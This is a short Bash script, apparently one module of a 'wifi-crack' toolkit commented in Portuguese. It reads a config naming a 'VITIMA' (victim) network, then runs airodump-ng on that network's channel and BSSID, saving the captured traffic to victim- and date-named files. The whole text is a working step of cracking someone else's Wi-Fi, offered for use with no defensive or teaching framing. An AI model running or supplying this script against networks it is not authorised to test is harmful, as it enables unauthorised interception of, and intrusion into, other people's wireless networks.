#!/bin/bash

PWD="$(pwd)"
source "$PWD/wifi-crack.conf"
#### VARIAVEIS UTILIZADAS
# DATA
# DIR_CONFIG_USER
# INTERFACE
# VITIMA
# CHANNEL
# BSSID


# Salvar em arquivo
mkdir -p "$DIR_CONFIG_USER"
echo "Nome dos arquivos salvos
$DIR_CONFIG_USER/$VITIMA-$DATA-XX"
airodump-ng --channel "$CHANNEL" --bssid "$BSSID" --write "$DIR_CONFIG_USER/$VITIMA-$DATA" "$INTERFACE"
echo "Nome dos arquivos salvos
$DIR_CONFIG_USER/$VITIMA-$DATA-XX"
